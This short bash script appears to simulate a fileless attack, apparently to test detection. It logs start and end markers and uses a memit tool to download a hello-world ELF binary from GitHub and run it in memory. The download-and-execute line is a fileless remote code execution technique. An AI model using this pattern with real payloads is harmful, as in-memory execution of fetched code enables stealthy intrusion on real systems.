#!/bin/bash
LOG_NAME="malicious.log"

echo "Fileless attack started" >> $LOG_NAME
./memit-linux-amd64 https://raw.githubusercontent.com/DenizBasgoren/elf32-hello-world/master/a.out &
echo "Fileless attack ended" >> $LOG_NAME
